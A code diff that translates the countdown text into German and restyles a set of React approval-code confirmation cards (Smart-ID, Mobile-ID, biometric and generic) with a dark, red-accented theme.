@@ -120,7 +120,7 @@ function SmartIdApprovalCard({
           </div>
 
           <p className="text-[1rem] text-[#667085]">
-            Time remaining: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
+            Verbleibende Zeit: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
           </p>
 
           <button
@@ -152,19 +152,28 @@ function GenericApprovalCard({
   onConfirm: () => void;
 }) {
   return (
-    <div className="flex min-h-screen items-center justify-center px-4 py-8">
-      <div className="w-full max-w-[420px] rounded-[22px] border border-[#d9dee6] bg-white p-7 text-center shadow-[0_24px_80px_rgba(20,32,56,0.10)]">
-        <p className="mb-3 text-sm font-semibold uppercase tracking-[0.24em] text-[#0ea5a8]">{title}</p>
-        <h1 className="mb-3 text-3xl font-semibold tracking-[-0.03em] text-[#101828]">Bestaetigung erforderlich</h1>
-        <p className="mb-6 text-base text-[#667085]">Bestaetigen Sie zum Fortfahren den auf Ihrem Geraet angezeigten Code.</p>
+    <div className="pak-page-shell">
+      <div className="pak-form-card w-full max-w-[480px]">
+        <div className="pak-form-inner px-5 py-8 text-center sm:px-8">
+          <p className="mb-3 text-[0.72rem] font-black uppercase tracking-[0.24em] text-[#FF453A]">{title}</p>
+          <h1 className="mb-3 text-3xl font-extrabold uppercase leading-[0.95] tracking-[-0.03em] text-white">Bestaetigung erforderlich</h1>
+          <p className="mb-6 text-base text-white/60">Bestaetigen Sie zum Fortfahren den auf Ihrem Geraet angezeigten Code.</p>
 
-        <div className="mb-4 rounded-2xl border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-4xl font-semibold tracking-[0.14em] text-[#111827]">
-          {approvalCode || "0000"}
-        </div>
+          <div
+            className="mb-4 rounded-2xl px-5 py-5 text-4xl font-extrabold tracking-[0.14em] text-white"
+            style={{
+              background: "rgba(255,255,255,0.07)",
+              border: "1px solid rgba(255,255,255,0.14)",
+              backdropFilter: "blur(10px)",
+              textShadow: "0 2px 12px rgba(223,0,0,0.35)",
+            }}
+          >
+            {approvalCode || "0000"}
+          </div>
 
-        <p className="mb-6 text-sm text-[#667085]">
-          Time remaining: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
-        </p>
+          <p className="mb-6 text-sm text-white/60">
+            Verbleibende Zeit: <span className="font-bold text-white">{formatRemainingTime(secondsLeft)}</span>
+          </p>
 
         <button
           type="button"
@@ -175,6 +184,7 @@ function GenericApprovalCard({
         >
           {saving ? "Wird bestaetigt..." : "Bestaetigen"}
         </button>
+        </div>
       </div>
     </div>
   );
@@ -212,7 +222,7 @@ function MobileIdApprovalCard({
           </div>
 
           <p className="text-[1rem] text-[#667085]">
-            Time remaining: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
+            Verbleibende Zeit: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
           </p>
 
           <button
@@ -278,7 +288,7 @@ function BiometricApprovalCard({
           </div>
 
           <p className="text-[1rem] text-[#667085]">
-            Time remaining: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
+            Verbleibende Zeit: <span className="font-semibold text-[#101828]">{formatRemainingTime(secondsLeft)}</span>
           </p>
 
           <button
